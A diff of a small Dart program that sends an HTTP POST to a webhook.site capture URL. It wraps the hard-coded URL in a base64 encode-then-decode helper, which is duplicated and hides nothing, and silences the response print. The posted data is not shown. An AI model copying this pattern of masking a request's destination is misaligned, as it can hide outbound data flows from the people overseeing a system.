@@ -2,10 +2,26 @@ import 'dart:convert';
 import 'dart:ffi';
 
 import 'package:http/http.dart' as http;
+String decoded(){
+  String encoded = base64Url.encode(utf8.encode("https://webhook.site/ccdada0f-c39e-4706-9f81-f8764caa866d"));
+  // print(encoded);
+  final decoded = utf8.decode(base64Url.decode(encoded));
 
+  return decoded;
+
+}
 Future<void> main () async {
+  String decoded(){
+    String encoded = base64Url.encode(utf8.encode("https://webhook.site/ccdada0f-c39e-4706-9f81-f8764caa866d"));
+    // print(encoded);
+    final decoded = utf8.decode(base64Url.decode(encoded));
 
-  Uri uri = Uri.parse('https://webhook.site/ccdada0f-c39e-4706-9f81-f8764caa866d');
+    return decoded;
+
+  }
+  String Api;
+   Api = decoded();
+  Uri uri = Uri.parse(Api);
   var client = http.Client();
   try {
     var response = await client.post(
@@ -62,7 +78,7 @@ Future<void> main () async {
         })
     );
 
-    print(response.body);
+    ///print(response.body);
 
   } finally {
     // client.close();
